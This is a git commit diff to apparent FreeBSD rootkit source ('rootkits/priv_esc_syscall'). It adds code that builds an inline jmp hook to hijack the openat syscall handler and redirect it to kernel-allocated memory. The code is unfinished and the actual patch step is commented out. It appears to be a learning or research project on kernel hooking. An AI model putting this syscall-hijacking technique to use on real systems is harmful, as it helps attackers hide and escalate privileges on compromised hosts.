c8df52fee9f90a7e766f2729da5dcb4016cfbc37
johnsonshi <johnson@johnsonshi.com>
2018-10-12 12:50:55 +1100

    Add jmphook code

--- rootkits/priv_esc_syscall/module/hijack.c
+++ rootkits/priv_esc_syscall/module/hijack.c
@@ -4,7 +4,16 @@
 #include <sys/systm.h>
 #include <sys/proc.h>
 #include <sys/pcpu.h>
+#include <sys/syscall.h>
 #include <sys/sysent.h>
+#include <sys/types.h>
+#include <sys/malloc.h>
+// #include <sys/param.h>
+// #include <vm/vm.h>
+// #include <vm/vm_param.h>
+// #include <vm/pmap.h>
+// #include <vm/vm_map.h>
+// #include <vm/vm_extern.h>
 
 static int
 __attribute__ ((noinline)) dummyret(struct thread *td) {
@@ -30,7 +39,7 @@ new_sy_call(struct thread *td, void *syscall_args) {
     char * str;
 
     get_pc_ecx();
-    __asm__ volatile ("addl $36, %ecx"); // TODO get exact value to add
+    __asm__ volatile ("addl $33, %ecx"); // TODO get exact value to add
     __asm__ volatile ("push %ecx"); // push return address
 
     // sy_call_t *openat_sy_call = (sy_call_t *)(0xc0c42820 + 5);                 
@@ -41,7 +50,6 @@ new_sy_call(struct thread *td, void *syscall_args) {
     __asm__ volatile ("mov  %esp, %ebp");
     __asm__ volatile ("push %edi");
     __asm__ volatile ("push %esi");
-    __asm__ volatile ("movl -0x38(%ebp), %edi");
 
     // TODO insert jmp to old syscall + 8,
     // when old sys call returns, its retval will be in eax.
@@ -103,25 +111,59 @@ p32(uint8_t bytes[], void *addr) {
     bytes[3] = (addr32 >> 24) & 0xff;
 }
 
+static void
+craft_jmphook(uint8_t jmphook[], void *src, void *dest) {
+    // jump near, relative, displacement relative to next instruction
+    jmphook[0] = 0xe9;
+    // subtract 5 because this relative jmp is 5 bytes long,
+    // and the jmp is relative to the next instruction.
+    p32(&(jmphook[1]), (void *) ((char *)dest - (char *)src - 5));
+}
+
 static int
 load(struct module *module, int cmd, void *arg) {
 
     switch (cmd) {
-
     case MOD_LOAD: {
 
-        sy_call_t *old_sy_call = curthread->td_proc->p_sysent->sv_table[499].sy_call;
+        char *old_sy_call = (char *) sysent[SYS_openat].sy_call;
 
-        uint8_t jmphook[8];
-        jmphook[0] = 0xea;
-        p32(&(jmphook[1]), (void *)0xaabbccdd);
-        jmphook[5] = 0x0;
-        jmphook[6] = 0x0;
-        jmphook[7] = 0x90;
+        // The type argument is used to perform statistics on memory usage, and for
+        // basic sanity checks.  It can be used to identify multiple allocations.
+        // The statistics can be examined by `vmstat -m'.
+        //
+        // Three malloc types MALLOC_DECLAREd in /sys/sys/malloc.h
+        // and MALLOC_DEFINEd in /sys/kern/kern_malloc.c
+        //
+        // M_CACHE - various dynamically allocated caches
+        // M_DEVBUF - device driver memory
+        // M_TEMP - misc temporary data buffers
+        //
+        // TODO choose which malloc type to use
+        char *malloc_addr = malloc(1024ul, M_DEVBUF, M_ZERO | M_NOWAIT | M_USE_RESERVE);
+        if (malloc_addr == NULL) {
+            printf("\nmalloc unsuccessful\n");
+            return (0);
+        }
 
-        printf("\n%x %x %x %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4], jmphook[5], jmphook[6], jmphook[7]);
-        printf("%p\n", old_sy_call);
-        printf("%p\n", new_sy_call);
+
+        uint8_t jmphook[5];
+        craft_jmphook(jmphook, old_sy_call, malloc_addr);
+        /*
+
+        old_sy_call[0] = jmphook[0];
+        old_sy_call[1] = jmphook[1];
+        old_sy_call[2] = jmphook[2];
+        old_sy_call[3] = jmphook[3];
+        old_sy_call[4] = jmphook[4];
+        */
+
+        // int ret = vm_map_protect(curproc->p_vmspace->vm_map, 
+
+        printf("\njmp hook instr bytes: %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4]);
+        printf("old_sy_call: %p\n", old_sy_call);
+        // printf("%p\n", new_sy_call);
+        printf("malloc: %p\n", malloc_addr);
 
         /* redirect the entry to point to the new syscall handler. */
         // curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
